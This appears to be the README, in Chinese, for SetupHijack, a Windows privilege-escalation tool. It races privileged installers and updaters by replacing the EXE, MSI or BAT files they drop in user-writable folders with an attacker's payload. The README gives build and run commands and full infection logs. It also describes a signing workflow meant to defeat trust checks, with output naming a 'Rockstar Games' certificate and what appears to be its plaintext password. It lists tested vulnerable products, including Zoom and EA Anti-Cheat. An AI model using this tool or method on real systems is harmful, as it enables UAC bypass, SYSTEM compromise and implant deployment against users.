# PrivilegeEscalation_SetupHijackOverview

SetupHijack 旨在利用 Windows 安装程序和更新程序中存在的条件竞争及不安全的文件处理行为，来从侧面实现权限维持/权限提升。它针对的场景是：具有特权的安装器或更新程序将可执行文件释放到全局可写目录（例如 `%TEMP%`、`%APPDATA%` 或 `%USERPROFILE%\Downloads`），随后以高权限（如 Administrator 或 SYSTEM）来执行。

该工具可实现在执行前将这些释放的文件替换为用户提供的载荷，可在无需初始提权的情况下实现权限提升。

⚠️ 仅限授权的红队演练、渗透测试及安全研究使用。

## 关键特性

- 无需管理员权限即可运行。
- 不依赖文件系统通知机制；采用轮询方式，兼容性更强。
- 支持感染 `.exe`、`.msi` 和 `.bat` 文件（例如常见工具如 `ipconfig`、`netstat` 或自定义命名的二进制文件）。
- 将原始文件备份为 `.bak`，便于恢复。
- 维护白名单（skiplist），避免重复感染同一文件。
- 所有操作均记录带时间戳的日志。
- 可用于识别因临时文件操作而存在 UAC 绕过风险的应用程序。

## 工作原理

SetupHijack 持续扫描 `%TEMP%`（及其子目录）中的新安装程序文件，当检测到目标文件时，将其替换为用户提供的载荷（EXE、MSI 或 BAT），并可选地将原始文件保存为 `.bak` 备份。
如果特权进程在完整性检查前执行了被替换的文件，则载荷将以高权限（如 SYSTEM 或 Administrator）运行。
工具会记录所有操作并维护白名单，防止重复感染。

## 代码签名说明

工具会使用基于 [SignToolEx.exe 和 SignToolExHook.dll](https://github.com/hackerhouse-opensource/SignToolEx) 的修改版代码签名流程对载荷和安装程序进行签名。使用有效的代码签名证书并添加 Authenticode 时间戳，可显著提高绕过安装程序及操作系统信任检查的成功率。

## 使用方法

### 构建

```cmd
nmake PAYLOAD=c:\Path\to\your\payload.exe
```

### 运行（选项）
```cmd
SetupHijack.exe # 扫描 %TEMP%、%APPDATA% 和 %USERPROFILE%\Downloads（默认）
SetupHijack.exe -notemp # 禁用扫描 %TEMP%
SetupHijack.exe -noappdata # 禁用扫描 %APPDATA%
SetupHijack.exe -nodownloads # 禁用扫描 %USERPROFILE%\Downloads
SetupHijack.exe clean # 清理模式（在所有启用的位置恢复 .bak 备份）
SetupHijack.exe verbose # 详细模式（记录所有操作）
SetupHijack.exe <payload.exe> # 使用指定载荷作为 .exe 替换（除非参数为已知选项）
```

在特权安装/更新进程启动前或期间运行 SetupHijack.exe。
默认情况下，工具会扫描所有常见释放位置：%TEMP%、%APPDATA% 和 %USERPROFILE%\Downloads, 可使用 `-notemp`、`-noappdata` 或 `-nodownloads` 标志禁用任意位置。
`clean` 标志可在所有启用的位置恢复备份。`verbose` 标志记录所有操作。
对于远程提权，可在终端服务（Terminal Services）环境中配合 `shadow.exe` 等工具使用。

## 攻击示例流程
构建你的载荷和 SetupHijack：
```cmd
nmake PAYLOAD=c:\Users\YourUser\Desktop\payload.exe
```

启动 SetupHijack：
```cmd
SetupHijack.exe
```

以管理员身份启动目标安装程序或更新进程。
如果安装程序将文件释放到 `%TEMP%` 并以高权限执行，载荷将被替换并运行。

## 示例输出

以下是构建和运行 SetupHijack 的真实示例，包括代码签名和感染输出：
```cmd
C:\Users\Fantastic\Desktop\Sayuri\InfectElevatedSetups >nmake PAYLOAD= "C:\USers\Fantastic\Desktop\DEMO\Renge_x64.exe "
Microsoft (R) Program Maintenance Utility Version 14.29.30159.0
Copyright (C) Microsoft Corporation. All rights reserved.
 powershell -Command "(Get-Content SetupHijack.cpp) -replace '#define PAYLOAD_PATH L\ ".*\ "', '#define PAYLOAD_PATH L\ "%ESCAPED_PAYLOAD%\ "' | Set-Content SetupHijack.cpp "
 cl /nologo /W4 /EHsc /DUNICODE /D_UNICODE /MT /O2 /c SetupHijack.cpp
SetupHijack.cpp
SetupHijack.cpp(318): warning C4189: 'hr2': local variable is initialized but not ref erenced
 taskkill /f /im SetupHijack.exe 2 >nul
 powershell -Command "Start-Sleep -Milliseconds 500 "
 link /nologo /SUBSYSTEM:CONSOLE /ENTRY:wmainCRTStartup /NODEFAULTLIB:MSVCRT /NODEFAULTLIB:MSVCPRT /OUT:SetupHijack.exe SetupHijack.obj kernel32.lib user32.lib shlwapi.lib Shell32.lib /MANIFEST /MANIFESTFILE:SetupHijack.exe.manifest
 copy /y install.wxs.template install.wxs
        1 file(s) copied.
 powershell -Command "(Get-Content install.wxs) -replace 'Source=\ "PAYLOAD_PLACEHOLDER\ "', 'Source=\ "%ESCAPED_PAYLOAD%\ "' | Set-Content install.wxs "
 wix build install.wxs -o install.msi
Generating install.bat with payload C:\USers\Fantastic\Desktop\DEMO\Renge_x64.exe
Generating launch_payload.bat with payload C:\USers \Fantastic\Desktop\DEMO\Renge_x64.exe
 powershell -Command "(Get-Content install.wxs) -replace '( <File Id=\ "RengeExeFile\ " Source=\ ").*?(\ " KeyPath=\ "yes\ "/ >)', '`%ESCAPED_PAYLOAD%`' | Set-Content install.wxs "
 call sign_random.bat
Using CERT: [certs\rockstar1.pfx]
Using PASS: [C!EZxYUxVGPzQDj3]
The following certificate was selected:
    Issued to: Rockstar Games, Inc.
    Issu ed by: Entrust Code Signing CA - OVCS1
    Expires: Thu Mar 20 17:16:13 3000
    SHA1 hash: C9793F4A2E629D88F2213622D7A0C170D9C7CBC6
Done Adding Additional Store
Successfully si gned: SetupHijack.exe
Number of files successfully Signed: 1
Number of warnings: 0
Number of errors: 0
The following certificate was selected:
    Issued to: Rockstar Games, Inc.
    Issued by: Entrust Code Signing CA - OVCS1
    Expires: Thu Mar 20 17:16:13 3000
    SHA1 hash: C9793F4A2E629D88F2213622D7A0C170D9C7CBC6
Done Adding Additional Store
Success fully signed: install.msi
Number of files successfully Signed: 1
Number of warnings: 0
Number of errors: 0
C:\Users\Fantastic\Desktop\Sayuri\InfectElevatedSetups >SetupHijack.exe
[2025-09-24 15:20:46] [SetupHijack] Using payload: C:\USers\Fantastic\Desktop\DEMO\Renge_x64.exe
[2025-09-24 15:20:46] [SetupHijack] If infecting .msi, will use: i nstall.msi
[2025-09-24 15:20:46] [SetupHijack] Polling enabled locations recursively for .exe, .msi, .bat:
[2025-09-24 15:20:46] - C:\Users\FANTAS～1\AppData\Local\Temp
[2025-09-2 4 15:20:46] - C:\Users\Fantastic\AppData\Roaming
[2025-09-24 15:20:46] - C:\Users\Fantastic\Downloads
[2025-09-24 15:20:46] [SetupHijack] Entering infection loop.
[2025-09-24 1 5:20:59] [SetupHijack] Total infections this session: 0
[2025-09-24 15:21:13] [SetupHijack] Replaced C:\Users\FANTAS～1\AppData\Local\Temp\installcmd.bat with payload install.bat, b ackup: C:\Users\FANTAS～1\AppData\Local\Temp\installcmd.bat.bak
[2025-09-24 15:21:13] [SetupHijack] New infections this run: 1
[2025-09-24 15:21:22] [SetupHijack] Replaced C:\Users\ Fantastic\Downloads\installcmd.msi with payload install.msi, backup: C:\Users\Fantastic\Downloads\installcmd.msi.bak
[2025-09-24 15:21:26] [SetupHijack] New infections this run: 1 
[2025-09-24 15:21:26] [SetupHijack] Total infections this session: 2
[2025-09-24 15:21:41] [SetupHijack] Replaced C:\Users\Fantastic\AppData\Roaming\InsecureApp\setup.exe with payl oad C:\USers\Fantastic\Desktop\DEMO\Renge_x64.exe, backup: C:\Users\Fantastic\AppData\Roaming\InsecureApp\setup.exe.bak
[2025-09-24 15:21:41] [SetupHijack] New infections this run: 1
[2025-09-24 15:21:53] [SetupHijack] Total infections this session: 3
```
## 部署植入载荷示例
下图展示了 SetupHijack 在特权安装程序运行期间部署植入载荷的实际效果：

![Example Use to Deploy An Implant](Example.png)

## 安全说明
- 本工具仅限授权测试和研究使用。
- 利用此类弱点可能导致完全的 SYSTEM 权限（当用户属于管理员组时）。
- 部分安装程序可能使用哈希/签名检查来阻止此攻击，但许多仍未实施。
- 务必在受控环境中使用。


## 已识别的漏洞
下面是一个测试过的可利用的软件文件列表：
在理想情况下，运行不受信任的 `.MSI` 可导致 `NT AUTHORITY\SYSTEM` 权限；而许多“UAC 提升”进程常通过 `.bat` 文件运行。由于执行发生在同一 USER SID 下（`%TEMP%` 目录由 `%USERPROFILE%` 唯一生成），可通过操纵继承父进程权限的 `.bat` 文件，在同会话内实现高完整性权限提升。

“临时文件高权限命令执行”是一种常见问题，可用于 UAC 绕过，并在非管理员用户（Admin-Less）环境下执行命令。安全桌面（Secure Desktop）上的 UAC 提示会显示被利用的应用程序（例如 Zoom 更新）。

- Zoom 6.6.1 (15968) 使用 `%AppData%` 存放 `.exe` 安装和更新文件，允许横向进程移动和进程伪装（例如从 Zoom 更新发起提权请求）。可执行文件易被操纵，用于凭证窃取等恶意目的。
```cmd
Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\airhost.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\aomhost64.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
...（省略）...
```

- msiexec.exe 在运行 install.msi 时以 NT AUTHORITY\SYSTEM 权限执行。
- Wireshark 更新程序通过 %Temp% 释放，但未赢得竞态。
- Visual Studio 更新程序的代码签名检查可阻止利用（.VSIX 轻度测试）。


```
C:\Users\FANTAS～1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\7z.exe with payload c:\Users\Fantastic\Desktop\DEMO\ Renge_x64.exe, backup: C:\Users\FANTAS～1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\7z.exe.bak
...（省略）...
```
- Cursor IDE 在 %TEMP% 中创建 .bat 文件和命令历史，可被用于向 Cursor 历史注入命令（提权能力有限）。

- JBL Quantum Engine 包含一个（现已修复的）命令注入漏洞，会从 JBL_QuantumENGINE_1.11.0.1511_x64 所在目录执行 "net"（包括 .bat）。最新版本使用新安装程序，不再受此特定命令注入漏洞影响（JBL_QuantumENGINE_Installer_2.2.13_x64.exe）。该问题于 2022 年 11 月作为 0day 被发现，可用于绕过 UAC 限制并获取管理员权限。SYSTEM 服务会在 %TEMP% 中写入 bat 文件用于调试/诊断。 ;-)

- EA Sports “EA Anti-Cheat Installer” 任意高权限命令执行。EA 游戏（如 "skate."）会安装一个反作弊服务，该服务使用临时且用户可写的目录。攻击者可在 STEAM 安装过程中替换 EAAntiCheat.Installer.exe，UAC 提权提示将来自 STEAM 引擎（显示 Valve 徽标和图标），但实际执行的是你的载荷 exe（以高权限运行）。